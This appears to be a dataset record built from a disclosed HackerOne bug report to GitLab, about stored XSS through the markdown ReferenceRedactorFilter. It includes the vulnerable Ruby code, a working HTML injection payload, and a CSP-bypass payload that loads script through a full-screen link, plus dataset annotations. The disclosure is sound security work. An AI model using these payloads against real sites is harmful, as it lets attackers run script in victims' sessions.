{
  "reported_to": "GitLab",
  "reported_by": "vakzz ",
  "title": "Stored XSS in markdown when redacting references",
  "content": "\nSummary\nIt's possible to inject arbitrary html into the markdown by abusing the ReferenceRedactorFilter. This is due to the data-original attribute allowing html encoded data to be stored, which is then extracted and used as the link content. If the original data already is html encoded then it will be unencoded after it is redacted:\nCode 681 Bytes\n1    def redacted_node_content(node)\n2      original_content = node.attr('data-original')\n3      link_reference = node.attr('data-link-reference')\n4\n5      # Build the raw <a> tag just with a link as href and content if\n6      # it's originally a link pattern. We shouldn't return a plain text href.\n7      original_link =\n8        if link_reference == 'true'\n9          href = node.attr('href')\n10          content = original_content\n11\n12          %(<a href=\"#{href}\">#{content}</a>)\n13        end\n14\n15      # The reference should be replaced by the original link's content,\n16      # which is not always the same as the rendered one.\n17      original_link || original_content || node.inner_html\n18    end\nSteps to reproduce\ncreate a private project with one account\ncreate an issue in the private project\nsign into another account that does not have permission to read the above project\nlink: <a href=\"https://gitlab.com/wbowling/private-project/-/issues/1\" title=\"title\">xss &lt;img onerror=alert(1) src=x></a>\n\n<div class=\"md\"><p data-sourcepos=\"1:1-1:124\" dir=\"auto\">link: <a href=\"https://gitlab.com/wbowling/private-project/-/issues/1\">xss <img onerror=\"alert(1)\" src=\"x\"></a></p></div>\n\nThe above is blocked by the csp, but that can be bypassed similar to https://hackerone.com/reports/662287#activity-6026826 (requires clicking anywhere on the page, but the link is full screen):\nCode 340 Bytes\n1link: <a href=\"https://gitlab.com/wbowling/private-project/-/issues/1\" title=\"title\">csp \n2&lt;a \n3  data-remote=&quot;true&quot;\n4  data-method=&quot;get&quot;\n5  data-type=&quot;script&quot;\n6  href=/wbowling/wiki/raw/master/test.js\n7  class='atwho-view select2-drop-mask pika-select'\n8&gt;\n9  &lt;img height=10000 width=10000&gt;\n10&lt;/a&gt;\n11</a>\nwhich generates the following html:\nCode 364 Bytes\n1<div class=\"md issue-realtime-trigger-pulse\"><p data-sourcepos=\"1:1-11:4\" dir=\"auto\">link: <a href=\"https://gitlab.com/wbowling/private-project/-/issues/1\">csp\n2</a><a data-remote=\"true\" data-method=\"get\" data-type=\"script\" href=\"/wbowling/wiki/raw/master/test.js\" class=\"atwho-view select2-drop-mask pika-select\">\n3<img height=\"10000\" width=\"10000\">\n4</a>\n5</p></div>\nImpact\nAnywhere the ReferenceRedactor is run arbitrary html can be injected. A user can setup their own private project, then post a comment or an issue on a public project linking to it and injecting the xss\nExamples\nexample payload: https://gitlab.com/vakzz-h1/stored-xss/-/issues/1\nwith csp bypass (requires clicking anywhere on the page): https://gitlab.com/vakzz-h1/stored-xss/-/issues/2\nWhat is the current bug behavior?\nThe data-original attribute can be abused to inject arbitrary html when a reference is redacted.\nWhat is the expected correct behavior?\nThe data-original should be double encoded or filtered before being reused.\nRelevant logs and/or screenshots\n<image_0>\nOutput of checks\nHappens on gitlab.com\nResults of GitLab environment info\nCode 853 Bytes\n1System information\n2System:\t\tUbuntu 18.04\n3Proxy:\t\tno\n4Current User:\tgit\n5Using RVM:\tno\n6Ruby Version:\t2.6.5p114\n7Gem Version:\t2.7.10\n8Bundler Version:1.17.3\n9Rake Version:\t12.3.3\n10Redis Version:\t5.0.7\n11Git Version:\t2.24.1\n12Sidekiq Version:5.2.7\n13Go Version:\tunknown\n14\n15GitLab information\n16Version:\t12.9.2-ee\n17Revision:\t0ad76f4d374\n18Directory:\t/opt/gitlab/embedded/service/gitlab-rails\n19DB Adapter:\tPostgreSQL\n20DB Version:\t10.12\n21URL:\t\thttp://gitlab-vm.local\n22HTTP Clone URL:\thttp://gitlab-vm.local/some-group/some-project.git\n23SSH Clone URL:\tgit@gitlab-vm.local:some-group/some-project.git\n24Elasticsearch:\tno\n25Geo:\t\tno\n26Using LDAP:\tno\n27Using Omniauth:\tyes\n28Omniauth Providers:\n29\n30GitLab Shell\n31Version:\t12.0.0\n32Repository storage paths:\n33- default: \t/var/opt/gitlab/git-data/repositories\n34GitLab Shell path:\t\t/opt/gitlab/embedded/service/gitlab-shell\n35Git:\t\t/opt/gitlab/embedded/bin/git\nImpact\nAnywhere the ReferenceRedactor is run arbitrary html can be injected. A user can setup their own private project, then post a comment or an issue on a public project linking to it and injecting the xss\n\n",
  "severity": [
    7.0,
    8.9
  ],
  "bounty": 5000,
  "weaknesses": [
    "Cross-site Scripting (XSS) - Stored"
  ],
  "screenshots": {
    "image_0": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/sJwpJkAHWSodEXRt6MuxXyYw?response-content-disposition=attachment%3B%20filename%3D%22Screen_Shot_2020-04-02_at_9.44.33_am.png%22%3B%20filename%2A%3DUTF-8%27%27Screen_Shot_2020-04-02_at_9.44.33_am.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQ72HSHSM5%2F20250325%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20250325T225321Z&X-Amz-Expires=3600&X-Amz-Security-Token=IQoJb3JpZ2luX2VjELL%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLXdlc3QtMiJHMEUCIACFIgPJymuvLs04o%2FphkqAZ0Ez2PLmvEd3i0xKi24cVAiEA3kYj3Jo3WWTumqRt16Zf2aUTT5VoLBaR1XwZ6Uzqoq4qsQUIGxADGgwwMTM2MTkyNzQ4NDkiDO%2FDV4Ln249zK5bi6yqOBWpXaujSA7c3UafccP753qZdwjkjabQrQzxvIfaHjPOVrvCuSfqOlksLzQy4UjDhnznIQRFWv4ZufvORCpXVyTWxC9r4tRnhYNP0LfGSW7%2FE0z9ka4mNsYj82%2BIdhPW97yJNOIvVMjxhwZODeOYzcEvsWRa%2F8BiTJbseqc6QnA2AZmSbuJq7xFO5R79VmHPYDWpCLzzekDWfqjFMYeQ085lDlqHBhE9JM9jx%2BC2bPOwWpX9bEup05YzKuXNiE5mr5TsfecbT6O%2F7afjBkGzwQzwcyLQ%2B7eEz9nVotv%2BCquJDz91XZlsHEQsq6b8HTrYdsNiR%2BioyiptlT%2By2kOsD3CI449g5r%2F9%2F3EzrpPHdGJYxBZ7JFxNuxf7kI%2BDY25Fa1hc6dv9DkkzfiE%2FSrVDl32Zfjbh3%2FTvBhKHtFSgzlhO%2BsA%2FwwRRxgPC7Yg43Bgke4x%2Bh1fA4sDEAj3p6ep4%2BAYkrix1sn7VKJd0Cx0y6%2FtrbRB8KV8dKmS9TXf2y6Q0yEGBnK4nNUHpXiio7gy%2FnRZTWe3XMe%2FKutH6GVpy9lQrGrw0Xep4xyg4YibEYBHZwJ02PFlxi2PxBdhvgzaas%2BcT8UeS1wc9sySkCeZollVnW7UHTwsnABsXbsvy9i9tk73XW%2BsVtXvsoQTEKNwCzL1SdazOIJJUXtTP4m%2F3GudOMdv9MVZMreckZldtLqbtgrjmN8poIi7MKytQL3uyhBc6oDpk99unLgCDd5WDmA26ajE62FryFIJRht1girTKbTbNHnadTTwjNpAidOeTx8h%2B8nNaQtbX0RM1d425ZKfkAhvgu9le%2BYvntBJCHHANOIw62Ic3mIQD0rVnxs40Pwc7yylR%2F2znYKbRdLdf7JTCK3Iu%2FBjqxARa%2BdYHRUv8L%2FwW74BhYYgChBDV7FCD%2BxKhQQ%2Bk1Cc2aQ8ROgWd1Yu4j5CmLym%2BMQKp8bgs6xwdGurSDrcS6cXYzMNQiiWPCh0dwqc8vdMkdgnsPAfQslKPiRhObpj5VMM6UrAelpsbauqgqJG%2FaF%2BR1smISimyV0GC9BAn3rE7Hq3hkWrdXdLOZi5CMjtGOuQMtGqST1%2BLXaGJUS8oZGqVIplOhjUWErsBamMGUvDARTA%3D%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=64117efc0b08ff3b8a5dcb4a3958d0ebbe8d635f13f450e976bb6c9cd37a718f"
  },
  "disclosed_date": 1599703080,
  "report_url": "https://hackerone.com/reports/836649",
  "is_multi_component": true,
  "complexity": "MEDIUM",
  "novelty": "HIGH",
  "vuln_category": "WEB_APP",
  "steps": [
    [
      1,
      "Create a private project with one account and create an issue in it."
    ],
    [
      2,
      "Sign into another account that does not have permission to read the private project and post a link to the issue with malicious HTML in the data-original attribute."
    ]
  ],
  "vuln_description": "A stored XSS vulnerability exists in the markdown rendering when redacting references. The vulnerability allows injecting arbitrary HTML via the data-original attribute, which is not properly sanitized when the reference is redacted. This can be exploited to execute JavaScript in the context of the victim's session.",
  "reason": "The vulnerability requires understanding the markdown rendering process, the reference redaction mechanism, and how to craft a payload that bypasses CSP. The interaction between the data-original attribute and the redaction logic is subtle and not immediately obvious.",
  "new_complexity": "HIGH",
  "requires_code": true,
  "requires_CVE": false,
  "is_ctf": false,
  "other_report": "662287",
  "injection_metadata": {
    "is_simple_payload": false
  },
  "authnz_metadata": {
    "reason": "The vulnerability involves injecting arbitrary HTML through the data-original attribute in markdown when redacting references. This is a stored XSS issue that occurs when processing user-controlled input in a specific context (ReferenceRedactorFilter). The methodology described focuses on authentication and authorization bypasses (IDOR and AuthN/AuthZ bypass) by testing different user sessions and resource IDs. However, this XSS vulnerability does not involve bypassing authentication or authorization checks through session or resource manipulation, but rather exploits improper handling of HTML encoding in content processing. Therefore, it would not be detected by the proposed methodology which is designed to find authN/authZ boundary violations.",
    "is_detectable": false
  }
}